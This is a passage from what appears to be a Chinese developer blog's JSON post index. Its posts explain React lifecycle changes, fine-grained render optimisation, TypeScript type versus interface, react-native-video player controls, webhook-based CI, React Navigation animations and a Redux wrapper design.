挂载之前) ，以及每次获取新的 props 之后。每次接收新的 props 之后都会返回一个对象作为新的 state，返回 null 则说明不需要更新 state。配合 componentDidUpdate，可以覆盖 componentWillReceiveProps 的所有用法。 12345class Example extends React.Component &#123; static getDerivedStateFromProps(nextProps, prevState) &#123; // 没错，这是一个 static，无法使用 this.props 和 this.state &#125;&#125; getSnapshotBeforeUpdate：触发时间：update 发生的时候，在 render 之后，在组件 dom 渲染之前。返回一个值，作为 componentDidUpdate 的第三个参数。配合 componentDidUpdate，可以覆盖 componentWillUpdate 的所有用法。 12345class Example extends React.Component &#123; getSnapshotBeforeUpdate(prevProps, prevState) &#123; // ... &#125;&#125; 建议用法总结初始化 state 在 constructor 初始化 state 就可以了。 请求数据 在 componentDidMount 请求异步加载的数据。 有一种错觉，在 componentWillMount 请求的数据在 render 就能拿到，但其实 render 在w illMount 之后几乎是马上就被调用，根本等不到数据回来，同样需要 render 一次“加载中”的空数据状态，所以在 didMount 去取数据几乎不会产生影响。 添加事件监听 在 componentDidMount 中添加加事件监听。react 只能保证 componentDidMount-componentWillUnmount 成对出现，componentWillMount 可以被打断或调用多次，因此无法保证事件监听能在 unmount 的时候被成功卸载，可能会引起内存泄露。 根据 props 更新 state 用 getDerivedStateFromProps(nextProps, prevState), 将传入的 props 更新到 state 上。用来代替 componentWillReceiveProps(nextProps, nextState)，willReceiveProps 经常被误用，导致了一些问题，因此该方法将不被推荐使用。getDerivedStateFromProps 是一个 static 方法，意味着拿不到实例的 this，所以想要在 setState 之前比对一下 props 有没有更新，下面方法是不能用了。 123if (this.props.currentRow !== nextProps.currentRow) &#123; // ...&#125; 取而代之的是，额外写一个 state 来记录上一个 props。 12345678if (nextProps.currentRow !== prevState.lastRow) &#123; return &#123; ... lastRow: nextProps.currentRow, &#125;; // 不更新 state return null&#125; 为什么我们不给一个 prevProps 参数呢，官方解释是，一来 prevProps 第一次被调用的时候是 null，每次更新都要判断耗性能，二来如果大家都习惯了，以后 react 不记录 prevProps 的话（啥），可以省下不少内存。 触发请求 在生命周期中由于 state 的变化触发请求，在 componentDidUpdate 中进行。 props 更新引起的副作用 props 更改引发的可视变化（副作用，比如 log，ga），在 componentDidUpdate 中处理。 1234567// 在didUpdate中根据props更新的确很不适应// props变了也是可以触发update的componentDidUpdate(prevProps, prevState) &#123; if (this.props.isVisible !== prevProps.isVisible) &#123; logVisibleChange(this.props.isVisible); &#125;&#125; componentWillUpdate，componentWillReceiveProps 在一次更新中可能会被触发多次，因此这种只希望触发一次的副作用应该放在保证只触发一次的componentDidUpdate 中。 props 更新时重新请求 传入新的 props 时重新异步取数据，getDerivedStateFromProps + componentDidUpdate 替代 componentWillReceiveProps。 12345678910111213141516171819202122232425// oldcomponentWillReceiveProps(nextProps) &#123; if (nextProps.id !== this.props.id) &#123; this.setState(&#123;externalData: null&#125;); this._loadAsyncData(nextProps.id); &#125;&#125;// newstatic getDerivedStateFromProps(nextProps, prevState) &#123; // Store prevId in state so we can compare when props change. if (nextProps.id !== prevState.prevId) &#123; return &#123; externalData: null, prevId: nextProps.id, &#125;; &#125; // No state update necessary return null;&#125;componentDidUpdate(prevProps, prevState) &#123; if (this.state.externalData === null) &#123; this._loadAsyncData(this.props.id); &#125;&#125; 在更新前记录原来的 dom 节点属性 在 update 之前获取 dom 节点，getSnapshotBeforeUpdate(prevProps, prevState)，代替 componentWillUpdate(nextProps, nextState)。getSnapshotBeforeUpdate 在 render 之后，但在节点挂载前。componentDidUpdate(prevProps, prevState, snapshot)，直接获得 getSnapshotBeforeUpdate 返回的 dom 属性值。 生命周期功能替换一览12345678910111213141516171819202122232425262728293031323334353637383940414243static getDerivedStateFromProps(nextProps, prevState) &#123; 4. Updating state based on props 7. Fetching external data when props change&#125;constructor() &#123; 1. Initializing state&#125;componentWillMount() &#123; // 1. Initializing state // 2. Fetching external data // 3. Adding event listeners (or subscriptions)&#125;componentDidMount() &#123; 2. Fetching external data 3. Adding event listeners (or subscriptions)&#125;componentWillReceiveProps() &#123; // 4. Updating state based on props // 6. Side effects on props change // 7. Fetching external data when props change&#125;shouldComponentUpdate() &#123;&#125;componentWillUpdate(nextProps, nextState) &#123; // 5. Invoking external callbacks // 8. Reading DOM properties before an update&#125;render() &#123;&#125;getSnapshotBeforeUpdate(prevProps, prevState) &#123; 8. Reading DOM properties before an update&#125;componentDidUpdate(prevProps, prevState, snapshot) &#123; 5. Invoking external callbacks 6. Side effects on props change&#125;componentWillUnmount() &#123;&#125; 小结从 react 16.3 开始组件的生命周期就开始改变了。而且变得很诡异，连名称也诡异，这对于许多第三方库来说是不友好的，因为目前位置很多库都没有打算更新生命周期。这样的话，很多的项目都会定格在 react 16.0 版本，不会更新到 react 16.4 版本。更多的尽请留言等，大家都原意更新的时候，再一起更新吧。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"React 性能优化：细粒度更新","slug":"React/React/React 性能优化：细粒度更新","date":"2018-07-24T12:09:27.000Z","updated":"2021-06-15T06:10:52.878Z","comments":true,"path":"/stories/2018/07/React/React/React 性能优化：细粒度更新/","link":"","permalink":"http://me.lizhooh.com/stories/2018/07/React/React/React 性能优化：细粒度更新/","excerpt":"前言在 React 里优化的方式有很多，它本身是一个灵活的框架，可以从多个方面去优化组件的渲染性能。 常用的优化手法有： shouldComponentUpdate 处的优化 使用 immutable 今天来谈谈，一个叫细粒度的优化方式。","text":"前言在 React 里优化的方式有很多，它本身是一个灵活的框架，可以从多个方面去优化组件的渲染性能。 常用的优化手法有： shouldComponentUpdate 处的优化 使用 immutable 今天来谈谈，一个叫细粒度的优化方式。 细粒度细粒度优化与 shouldComponentUpdate 优化差不多，不过细粒度优化更加注重于细度的优化。 那么到底什么是细粒度优化呢？ 以知乎日报首页为例，在首页里有轮播图和列表还有 Appbar。大致的结构组成如下： 1234567&lt;View&gt; &lt;AppBar title='首页' /&gt; &lt;List renderHeader=&#123;() =&gt; &lt;Slider /&gt;&#125; data=&#123;list&#125; /&gt;&lt;/View&gt; 使用过知乎日报都知道，当用户滚动列表下，AppBar 上的 title 是一个动态变化的过程。一开始是首页，当滚动到今日热闻时就会显示今日热闻。 这意味着按照常规的做法是更新首页的应用数据状态。 123456789101112131415161718192021222324252627import React, &#123; Component &#125; from 'react';export default class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; list: [], title: '首页', &#125;; &#125; render() &#123; const &#123; title &#125; = this.state; return ( &lt;View&gt; &lt;AppBar title=&#123;title&#125; /&gt; &lt;List renderHeader=&#123;() =&gt; &lt;Slider /&gt;&#125; data=&#123;list&#125; onScroll=&#123;e =&gt; &#123; // 滚动到特定位置，更新 title this.setState(&#123; title: 'xxx' &#125;); &#125;&#125; /&gt; &lt;/View&gt; ); &#125;&#125; 在这里有非常多的优化地方，在 List 上就是一个。当滚动到某个特定位置时更新 title，会导致 List 又重新渲染。当 List 的数据比较大时，这部分会成为瓶颈的存在。 那么，优化可以从 List 的 shouldComponentUpdate 来优化，在 shouldComponentUpdate 里决定是否重新渲染，但是这不是细粒度的更新。 细粒度的做法是：title 不应该在本组件的 state 里，title 应该成为 AppBar 的内部状态，由 AppBar 自己管理。 AppBar 通过提供外部的接口来更新内部的状态。因此 AppBar 应该写正这样。 12345678910111213141516171819202122class AppBar extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; title: props.initTitle || '', &#125; &#125; update = (title) =&gt; &#123; if (title !== this.state.title) &#123; this.setState(&#123; title &#125;) &#125; &#125; render() &#123; return ( &lt;Text&gt; &#123;this.state.title&#125; &lt;/Text&gt; ); &#125;&#125; 在滚动条滚动到某个位置的时候，无需使用 this.setState 更新 App 组件的状态，而是使用 AppBar 的 update 方法去更新它的 title。 123456789101112131415161718192021222324export default class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; list: [], &#125;; &#125; render() &#123; const &#123; title &#125; = this.state; return ( &lt;View&gt; &lt;AppBar iniTtitle='首页' ref=&#123;r =&gt; this._appbar = r&#125; /&gt; &lt;List renderHeader=&#123;() =&gt; &lt;Slider /&gt;&#125; data=&#123;list&#125; onScroll=&#123;e =&gt; &#123; // 滚动到特定位置，更新 title this._appbar.update('xxx'); &#125;&#125; /&gt; &lt;/View&gt; ); &#125;&#125; 这样一来，省了 List 的 shouldComponentUpdate 的优化，又能灵活的控制更新的元素，也就是所谓的细粒度更新。 优缺点细粒度更新的优点是： 灵活控制更新，在一些频繁更新的地方可以做大细致的位置更新。 避免 this.setState 对整个大的 State 树进行渲染，能够有不错的性能提升。上面的为例，在没有使用细粒度更新之前，滚动时产生的性能是 40 PFS，在使用细粒度更新后，滚动时产生的性能是 58 PFS。因为只需要 render AppBar 一小部分，无需 render List，所以有着很大的性能提升。 细粒度更新的缺点是： 需要编写更多的代码，来改造。 每一个细致的更新点都需要抽象，有点不符合 React 纯函数编程的风格。 如果 List 是 AppBar 的子组件，那么就无法进行细粒度更新。 总的来说，细粒度更新在特定的环境是还是一个不错的优化方式。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"谈谈 Typescript 中 type 与 interface 的区别","slug":"Typescript/谈谈 Typescript 中 type 与 interface 的区别","date":"2018-07-17T14:47:12.000Z","updated":"2021-06-15T06:10:52.898Z","comments":true,"path":"/stories/2018/07/Typescript/谈谈 Typescript 中 type 与 interface 的区别/","link":"","permalink":"http://me.lizhooh.com/stories/2018/07/Typescript/谈谈 Typescript 中 type 与 interface 的区别/","excerpt":"前言因为在 Typescript 里 type 和 interface 都能实现类型的定义，因此在一些使用方面他们都很像。","text":"前言因为在 Typescript 里 type 和 interface 都能实现类型的定义，因此在一些使用方面他们都很像。 相似的type 用于定义数据的类型别名。interface 用于定义数据的类型别名。 123456789101112131415type TUserListResult = Promise&lt;&#123; total: number, list: [&#123; title: string, id: number, &#125;],&#125;&gt;interface IDataListResult &#123; total: number, list: [&#123; title: string, id: number, &#125;],&#125; 例如上面的代码里，使用 type 定义了一个符合类型的别名。使用 interface 定义了一个复合类型接口。在使用的时候会有稍稍的不同。 1234567891011function getUserList(offset: number): TUserListResult &#123; return new Promise((resolve, reject) =&gt; &#123; // ... &#125;);&#125;function getDataList(offset: number): Promise&lt;IDataListResult&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; // ... &#125;);&#125; 同时智能提示带来的结果也不同。 type 与 interface 之间的相同点都是可以描述一个对象或函数。 不相似的type 与 interface 都可以实现继承，但是他们的表现形式不同。 123456789101112interface Name &#123; name: string;&#125;interface User extends Name &#123; age: number;&#125;// type 利用交叉类型实现的继承type Name = &#123; name: string;&#125;type User = Name &amp; &#123; age: number &#125;; 因为 type 作为类型的别名，因此可以轻易的实现声明基本类型别名，联合类型，元组等类型，而 interface 则不行。 此除之外，type 还能通过 typeof 获取类型，并声明。 12let div = document.createElement('div');type B = typeof div; interface 能够声明合并，而 type 不行（会报重复声明错误）。 1234567interface User &#123; name: string, age: number,&#125;interface User &#123; sex: string,&#125; 小结在通常情况下，都是使用 interface 定义类型，在极少情况下会使用 type。","categories":[{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/categories/Typescript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/tags/Typescript/"}]},{"title":"React Native Video 进阶指南","slug":"React Native/Media/React Native Video 进阶指南","date":"2018-07-16T12:57:15.000Z","updated":"2021-06-15T06:10:52.856Z","comments":true,"path":"/stories/2018/07/React Native/Media/React Native Video 进阶指南/","link":"","permalink":"http://me.lizhooh.com/stories/2018/07/React Native/Media/React Native Video 进阶指南/","excerpt":"前言在本节是是 react-native-video 的进阶指南。react-native-video 是一个 RN 上的视频库，它比较基础，不涉及太多 UI 控制层。在实际的开发中如果使用 react-native-video 做视频播放，那就要自己实现播放的控制栏，已经全屏播放等。 本文主要围绕着如何在 react-native-video 里做定制播放器界面。","text":"前言在本节是是 react-native-video 的进阶指南。react-native-video 是一个 RN 上的视频库，它比较基础，不涉及太多 UI 控制层。在实际的开发中如果使用 react-native-video 做视频播放，那就要自己实现播放的控制栏，已经全屏播放等。 本文主要围绕着如何在 react-native-video 里做定制播放器界面。 开源react-native-ivideo 是笔者写的一个 React Native 视频播放组件，现在已经开源出来了。 有以下特性： 基本的播放功能，友好的界面，进度控制，渐出动画，简洁的风格。 细粒度优化，播放时 UI 线程能保持 60 FPS，JS 线程能保持 60 ~ 55 FPS。 提供全屏播放的功能。 支持 MP4，M4A，FMP4，WebM，MKV，MP3，Ogg，WAV，MPEG-TS，MPEG-PS，FLV 和 ADTS（AAC）等格式。 支持 DASH，HlS 和 SmoothStreaming 自适应流。 自定义控制栏在 react-native-video 里可以使用 onProcess 事件，它在每次视频进度改变时都会触发。 12345&#123; currentTime: 5.2, // 当前播放长度 playableDuration: 34.6, // 已经缓冲的长度 seekableDuration: 888 // 播放长度&#125; 有的播放的位置之后，可以使用 Slider 作为控制栏的进度拖动模块。 123456789101112131415161718192021222324&lt;View style=&#123;styles.toolbar&#125;&gt; &lt;Slider minimumTrackTintColor='#f90' maximumTrackTintColor='rgba(1, 1, 1, 0)' thumbTintColor=&#123;showToolbar ? '#f90' : 'rgba(1, 1, 1, 0)'&#125; maximumValue=&#123;seekableDuration&#125; value=&#123;currentTime&#125; onTouchStart=&#123;e =&gt; &#123; this.sliderTouch = true; this.setState(&#123; showToolbar: true &#125;); &#125;&#125; onTouchEnd=&#123;e =&gt; &#123; this.sliderTouch = false; if (showToolbar) &#123; setTimeout(() =&gt; this.setState(&#123; showToolbar: false &#125;), 1000 * 5); &#125; &#125;&#125; onSlidingComplete=&#123;val =&gt; &#123; this.setState(&#123; currentTime: val &#125;); this.video.seek(val); // 拖动位置 &#125;&#125; style=&#123;&#123; width: window.width + 20, left: -10 &#125;&#125; /&gt;&lt;/View&gt; 自定义播放控制也就是添加一个播放与暂停的功能，大致实现的方式是在 video 里利用 absolute 添加一个浮层当点击播放时，浮层完全透明，当点击暂时时，浮层显示。 123456&lt;Touch style=&#123;[styles.mask, !play &amp;&amp; styles.maskc]&#125; activeOpacity=&#123;0.9&#125; onPress=&#123;e =&gt; this.setState(&#123; play: !play &#125;)&#125;&gt; &lt;Icon name='play-circle-outline' size=&#123;48&#125; color='#efefef' /&gt;&lt;/Touch&gt; 全屏播放react-native-video 是支持全屏播放的，但是它的 api 只适用于 IOS，并且全屏播放没有自定义 UI 的空间。下面是我实现的全屏播放效果，大致原理是使用控制应用方向和利用元素出界不可见的形式，也就是 overflow: hidden。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import React, &#123; Component &#125; from 'react';import &#123; StyleSheet, Text, View, StatusBar, TouchableOpacity as Touch, Slider,&#125; from 'react-native';import Video from 'react-native-video';import Orientation from 'react-native-orientation';import Icon from 'react-native-vector-icons/MaterialIcons';export default class App extends Component &#123; constructor(props) &#123; super(props); this.currentTime = 0; // 播放位置 this.state = &#123; fullscreen: false &#125;; this.src = 'http://vd3.bdstatic.com/mda-igdqvqu5yt17xp89/mda-igdqvqu5yt17xp89.mp4'; &#125; render() &#123; const &#123; fullscreen &#125; = this.state; if (fullscreen) &#123; // 全屏 Orientation.lockToLandscape(); &#125; else &#123; Orientation.unlockAllOrientations(); Orientation.lockToPortrait(); &#125; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;StatusBar animated=&#123;true&#125; barStyle=\"light-content\" translucent=&#123;true&#125; backgroundColor='rgba(1, 1, 1, 0)' StatusBarAnimation='fade' /&gt; &lt;Video source=&#123;&#123; uri: this.src &#125;&#125; style=&#123;fullscreen ? styles.fullscreen : styles.defaults&#125; resizeMode='cover' ref=&#123;r =&gt; this.video = r&#125; // paused=&#123;true&#125; onProgress=&#123;d =&gt; this.currentTime = d.currentTime&#125; /&gt; &lt;View style=&#123;styles.toolbar&#125;&gt; &lt;Icon name='play' /&gt; &lt;/View&gt; &lt;Touch activeOpacity=&#123;0.75&#125; onPress=&#123;e =&gt; this.setState(&#123; fullscreen: !fullscreen &#125;)&#125; style=&#123;styles.touch1&#125;&gt; &lt;Icon name='fullscreen' size=&#123;24&#125; /&gt; &lt;/Touch&gt; &lt;/View&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, backgroundColor: '#fff', &#125;, defaults: &#123; width: '100%', backgroundColor: '#012', height: 240, &#125;, fullscreen: &#123; width: '100%', // 填充满 height: '100%', backgroundColor: '#000', &#125;, touch1: &#123; position: 'absolute', bottom: 20, right: 20, backgroundColor: '#ced', padding: 6, paddingHorizontal: 12, borderRadius: 2, &#125;, touch2: &#123; position: 'absolute', bottom: 20, right: 20, backgroundColor: '#fff', padding: 6, paddingHorizontal: 12, borderRadius: 2, &#125;&#125;); 下面是全屏的效果图。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"利用 WebHooks 进行自动化构建","slug":"后端/利用 WebHooks 进行自动化构建","date":"2018-07-12T14:34:25.000Z","updated":"2021-06-15T06:10:52.911Z","comments":true,"path":"/stories/2018/07/后端/利用 WebHooks 进行自动化构建/","link":"","permalink":"http://me.lizhooh.com/stories/2018/07/后端/利用 WebHooks 进行自动化构建/","excerpt":"前言Webhooks 是一个 API 概念，在某件事情发生时，它都会进行消息的推送，在 Github、Gitlab 等代码管理应用上都有 WebHooks 的功能，在 slack、discord 等聊天应用里都有接收 Webhooks 消息的接口，这样一来 Webhooks 的使用意义就很大了。 在持续集成工具里有一个老管家：jenkins，它可以根据 Git 的消息去自动的构建应用。现在利用 Webhooks 的机制也可以实现类似的功能。","text":"前言Webhooks 是一个 API 概念，在某件事情发生时，它都会进行消息的推送，在 Github、Gitlab 等代码管理应用上都有 WebHooks 的功能，在 slack、discord 等聊天应用里都有接收 Webhooks 消息的接口，这样一来 Webhooks 的使用意义就很大了。 在持续集成工具里有一个老管家：jenkins，它可以根据 Git 的消息去自动的构建应用。现在利用 Webhooks 的机制也可以实现类似的功能。 自动化构建在 Github 里，当提交一个 commit （或其他操作）时，就会触发一个 WebHooks，这个 WebHooks 就是向用户指定的 API 接口发送一个 POST 请求，请求体里会附带一些数据信息。因此，可以利用这个特性，实现自动化构建，也就是持续集成功能。 大致的流程如下： 启动一个 Nodejs 服务，定义好接口。 在 Github 上设置 WebHooks 接口地址。 此时，如果用户提交一个 commit，会触发一个 WebHooks 请求目标地址。 在 Nodejs 后端路由里处理相关操作。以前端构建为例 使用 git 拉取最新的代码。 使用 npm run build 编译前端代码。 启动部署服务。 在构建完成后，向其他 WebHooks 接收方发送消息，例如发到 slack、discord 上。 因为构建是一个异步过程并且有时候会出现并发的 WebHooks，因此还需要做一些任务队列的管理。 实现首先，实现的是路由功能。使用 Koa + Koa-Router。 123router.post('/ci', async ctx =&gt; &#123; // 略&#125;); 接着是 git 拉取功能。使用的是 nodegit 这个库。 1// 略 最后在构建完成后向 slack、discord 发消息。 1// 略","categories":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/categories/后端/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"}]},{"title":"React-Navigation 自定义导航动画","slug":"React Native/Router/React-Navigation 自定义导航动画","date":"2018-07-10T03:30:03.000Z","updated":"2021-06-15T06:10:52.868Z","comments":true,"path":"/stories/2018/07/React Native/Router/React-Navigation 自定义导航动画/","link":"","permalink":"http://me.lizhooh.com/stories/2018/07/React Native/Router/React-Navigation 自定义导航动画/","excerpt":"前言React Navigation 源于 React Native 社区对一个可扩展且易于使用的导航解决方案的需求，它完全使用 JavaScript 编写。React Navigation 所有内容都是使用 JavaScript 在 React Native 的基础上编写的。动画使用 Animated API 及其 Native 驱动程序选项，以便在主线程上运行动画并生成平滑的 60 fps 切换动效。 在 React Navigation 里，默认的导航动画是 Android/IOS 上的原生效果，也就是在 Android 上是从底部到顶部的淡滑效果，在 IOS 上是从右到左的平滑效果。但是往往在开发应用的时候我们更倾向于同于使用从右到左的平滑效果。React Navigation 并没有提供这方面的动画效果，而是需要开发者自己去定义。","text":"前言React Navigation 源于 React Native 社区对一个可扩展且易于使用的导航解决方案的需求，它完全使用 JavaScript 编写。React Navigation 所有内容都是使用 JavaScript 在 React Native 的基础上编写的。动画使用 Animated API 及其 Native 驱动程序选项，以便在主线程上运行动画并生成平滑的 60 fps 切换动效。 在 React Navigation 里，默认的导航动画是 Android/IOS 上的原生效果，也就是在 Android 上是从底部到顶部的淡滑效果，在 IOS 上是从右到左的平滑效果。但是往往在开发应用的时候我们更倾向于同于使用从右到左的平滑效果。React Navigation 并没有提供这方面的动画效果，而是需要开发者自己去定义。 相关文章：React Native Navigator 自定义动画 这篇文章写时，时 v2.x 版本的，现在 React Navigation 更新到 3.x 版本，在后面补上 3.x 版本的方式。 平滑动画效果默认的 StackNavigator 导航动画效果是下面几个文件里。 1234react-navigation\\src\\navigators\\createContainedStackNavigator.js // 容器react-navigation\\src\\navigators\\createStackNavigator.js // 导航构建react-navigation\\src\\views\\StackView\\StackViewTransitionConfigs.js // 转换配置react-navigation\\src\\views\\StackView\\StackViewStyleInterpolator.js // 样式配置 在 StackNavigator 的配置项里有一个 transitionConfig 的属性是用于配置转换的动画效果的。 transitionConfig 是一个回调函数，你需要返回一个配置项。这个配置项通常包括了两个方面：transitionSpec 和 screenInterpolator。 123456789const MainPage = StackNavigator(&#123; Login: &#123; screen: Login &#125;, Register: &#123; screen: Register &#125;,&#125;, &#123; transitionConfig: () =&gt; (&#123; transitionSpec: &#123;&#125;, // Animated 的配置 screenInterpolator: () =&gt; &#123;&#125;, // 转场插值 &#125;),&#125;; 自定义动画主要是修改这两个方面的值。在 transitionSpec 里定义动画的效果，比如持续时间，缓冲函数等。在 screenInterpolator 里定义页面的进场与出场的效果，比如从右边平移到左边。 123456789transitionSpec: &#123; duration: 260, // 持续时间 easing: Easing.bezier(0.27, 0.58, 0.38, 1), // 缓动函数 timing: Animated.spring, // 从时间范围映射到渐变的值 velocity: 1.5, // 速度 tension: 200, // 张力 friction: 26, // 摩擦力 useNativeDriver: true, // RN 0.43 // 是否使用原生实现&#125;, 12345678910111213141516screenInterpolator: (sceneProps) =&gt; &#123; const &#123; layout, position, scene &#125; = sceneProps; const &#123; index &#125; = scene; const height = layout.initHeight; const width = layout.initWidth; // 输入的值是 index - 1，index，index - 1 （x, y, z） // 输出的值是 width, 0, 0 （x, y, x） const translateX = position.interpolate(&#123; inputRange: [index - 1, index, index + 1], outputRange: [width, 0, 0], &#125;); return &#123; transform: [&#123; translateX &#125;] &#125;;&#125; 在 interpolate 里有两个属性 inputRange 和 outputRange，这两个属性分别是输入值与输出值。 看到的效果是这样的。 还可以为其添加透明度变化和放缩值，旋转等。 1234567891011121314151617181920212223242526272829303132screenInterpolator: (sceneProps) =&gt; &#123; const &#123; position, scene, layout &#125; = sceneProps; const &#123; index &#125; = scene; const &#123; initWidth &#125; = layout; // 透明度 const opacity = position.interpolate(&#123; inputRange: [index - 1, index, index + 0.99, index + 1], outputRange: [1, 1, 0.4, 0], &#125;); // 放缩 const scale = position.interpolate(&#123; inputRange: [index - 1, index, index + 1], outputRange: [1, 1, 0.95], &#125;); // 平移 const _width = Math.round(initWidth * 0.3); const translateX = position.interpolate(&#123; inputRange: [index - 1, index, index + 1], outputRange: [initWidth, 0, -_width], &#125;); return &#123; opacity, transform: [ &#123; scale &#125;, &#123; translateX &#125;, ] &#125;;&#125; 具体怎样的动画变化一切都按你的想法来。 阴影可以看出导航的效果是没有一些阴影效果的。在 IOS 上提供了 shadowColor 等阴影效果值，在 Android 上却只提供了 elevation。但是在 v4+ 版本上 elevation 是无效的，那么可以使用 react-native-linear-gradient 来实现这种效果。 具体参考这篇文章：React Native 中如何给 Navigator 添加一条合格的阴影？ 3.x 版本2020-06-03 日补充： 3.x 版本 config 有些不同，是直接写在组件上的。 在 3.x 版本，动画的配置在 transitionConfig 的 screenInterpolator 上（和之前的一样）。 12345transitionConfig: () =&gt; (&#123; screenInterpolator: (sceneProps) &#123; // ... 自己写 &#125;,&#125;), 然后在 react-navigation-stack 的源码里藏了一堆的导航切换动画的配置（就不能直接把这部分函数导出吗？）。 1import StackViewStyleInterpolator from 'react-navigation-stack/src/views/StackView/StackViewStyleInterpolator'; 默认有这几个导出： 1234567891011121314export default &#123; // 像 IOS 那种横向切换页面 forHorizontal, // 像 IOS 那种竖向切换页面 forVertical, // 像 Android 那种，从底部往上打开，有个渐变过程 forFadeFromBottomAndroid, // 像 Android 那种，从上往下打开，有个渐变过程 forFadeToBottomAndroid, // 渐变打开页面 forFade, // 没有动画 forNoAnimation,&#125;; 我后续会写个 npm，直接导出这部分代码，叫 react-navigation-animated-type 吧。 怎么用呢？直接喂给 screenInterpolator 即可。 123transitionConfig: () =&gt; (&#123; screenInterpolator: StackViewStyleInterpolator.forHorizontal,&#125;), 后来看了看动画的 API，发现其实是有提供设置动画类型的，其实是我看走眼了。 https://reactnavigation.org/docs/stack-navigator/#animations 参考资料 Add support for custom transitionConfig react-native-navigation-custom-scene-screen-transitions-and-interpolations http://www.php.cn/js-tutorial-383970.html","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"基于 Redux 的框架设计","slug":"Redux/基于 Redux 的框架设计","date":"2018-07-04T07:59:49.000Z","updated":"2021-06-15T06:10:52.893Z","comments":true,"path":"/stories/2018/07/Redux/基于 Redux 的框架设计/","link":"","permalink":"http://me.lizhooh.com/stories/2018/07/Redux/基于 Redux 的框架设计/","excerpt":"前言Redux 是一个数据流管理框架，现在被大量使用在 React 应用开发里。在 Redux 里有非常复杂的概念，当你使用 Redux 的时候会发现 Redux 很绕。的确 Redux 的代码是比较多。对一个一个需要加载数据的组件，使用 Redux 会存在很多重复的代码编写，特别是写 Reducer。 本文介绍的是如何基于 Redux 设计一个上层的框架。此框架的目的就是为了简化 Redux 相关的代码编写，让整个项目的开发更加容易以及更好的维护。","text":"前言Redux 是一个数据流管理框架，现在被大量使用在 React 应用开发里。在 Redux 里有非常复杂的概念，当你使用 Redux 的时候会发现 Redux 很绕。的确 Redux 的代码是比较多。对一个一个需要加载数据的组件，使用 Redux 会存在很多重复的代码编写，特别是写 Reducer。 本文介绍的是如何基于 Redux 设计一个上层的框架。此框架的目的就是为了简化 Redux 相关的代码编写，让整个项目的开发更加容易以及更好的维护。 命名先个框架命一个名称，就叫 Redux-Fine 吧。对于命名来说并不需要有什么特别的意义，而是根据自己的喜欢即可。Fine 命为精细、细微、优秀等意思，这是我一个非常喜欢的单词。 约定无论是什么框架都会有一些约定的，就像 Redux 一样，它约定了 Store、Action、Reducer 等概念。 在 Redux-Fine 里，我设计了以下约定： 不需要写 Reducer，这部分会在框架初始化的时候自动构建。 为了简化代码，Action 的写法将改变。 使用 ES6 的语法开发。 只适用于逻辑拆分（combineReducers）方式。因为在大多数项目里都会使用逻辑拆分，很少会使用只有一个 reducer 的方式，如果只有一个 reducer，那根本没必要使用 Redux。 逻辑拆分不能嵌套扩展，只能同级垂直扩展，一个逻辑拆分定义为一个 module。 为了方便获取 module，可以使用全局的方式引入，就像 mongoose 一样。 提供一键创建 store 的方式，少写点代码。 设计在 Redux-Fine 里被设计为 Reducer 自动构建，为 Action 提供一个 commit 函数，返回的就是最新的数据。 Module通常对于大型的应用来说，做逻辑拆分是很有必要的。在 Redux 里做逻辑拆分，使用 combineReducers 函数，它可以把一颗大的 State 树，拆分为几个小的 State 树。 例如，下面的对象就是一个典型的逻辑拆分后的树结构。 123456&#123; home: &#123;&#125;, // Home 页面的数据 user: &#123;&#125;, // User 页面的数据 admin: &#123;&#125;, // Admin 页面的数据 login: &#123;&#125;, // Login 页面的数据&#125; 逻辑拆分常用的手法是，每一个页面对应着一个小 State 树，这样设计层次会比较清晰（千万不要，进行多维度的嵌套）。 基于这种理论，在 Redux-Fine 里定义了一个 Module 的基类，用户只需要继承这个基类，实现对应的 module 功能即可。一个 Module 就代表着一个逻辑拆分。 123456class UserModule extends fine.Module &#123; // ...&#125;// 注册一个 module，此时 redux-fine 会自动构建 reducer 的相关代码。fine.modules('user', UserModule); 基于类的继承实现 Module 有几个好处： 可以集中式的管理，每一个逻辑拆分的内容。 在类里可以很方便的使用 this 引用上下文。 